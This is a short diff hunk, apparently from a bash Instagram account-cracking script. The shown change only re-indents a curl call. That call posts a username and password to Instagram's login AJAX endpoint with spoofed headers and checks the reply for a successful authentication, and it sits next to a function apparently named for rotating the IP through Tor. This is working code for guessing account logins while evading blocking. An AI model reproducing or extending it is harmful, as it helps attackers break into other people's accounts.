@@ -112,13 +112,13 @@ function ch4ng3_iP_t0r()
 
 function g0_l0g1n(){
 	local cHk_l0g1n=$(curl -s 'https://www.instagram.com/accounts/login/ajax/' \
-					  -H 'Cookie: csrftoken='$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
-					  -H 'X-Instagram-AJAX: 1' \
-					  -H 'Referer: https://www.instagram.com/' \
-					  -H 'X-CSRFToken:'$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
-					  -H 'X-Requested-With: XMLHttpRequest' \
-					  --data 'username='$us3rn4m3'&password='$p4sswd'&intent' \
-					  -L --compressed -s -c c00kies.txt | grep -o '"authenticated": true')
+			  -H 'Cookie: csrftoken='$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
+			  -H 'X-Instagram-AJAX: 1' \
+			  -H 'Referer: https://www.instagram.com/' \
+			  -H 'X-CSRFToken:'$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
+			  -H 'X-Requested-With: XMLHttpRequest' \
+			  --data 'username='$us3rn4m3'&password='$p4sswd'&intent' \
+			  -L --compressed -s -c c00kies.txt | grep -o '"authenticated": true')
 	local cHk_l0g1n2=$(curl -s 'https://www.instagram.com/accounts/login/ajax/' \
 			   -H 'Cookie: csrftoken='$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
 			   -H 'X-Instagram-AJAX: 1' \
